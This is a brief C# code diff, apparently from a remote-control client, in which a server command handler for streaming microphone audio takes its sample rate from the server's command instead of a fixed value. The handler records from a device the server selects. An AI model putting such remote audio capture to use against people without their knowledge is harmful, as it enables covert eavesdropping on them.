@@ -38,7 +38,7 @@ namespace xClient.Core.Commands {
         public static void HandleGetAudioStream(Packets.ServerPackets.GetAudioStream command, Client client) {
 
             try {
-                var waveFormat = new WaveFormat(44100, command.Channels);
+                var waveFormat = new WaveFormat(command.SampleRate, command.Channels);
                 _waveInEvent = new WaveInEvent {
                     BufferMilliseconds = 50,
                     DeviceNumber = command.Device,
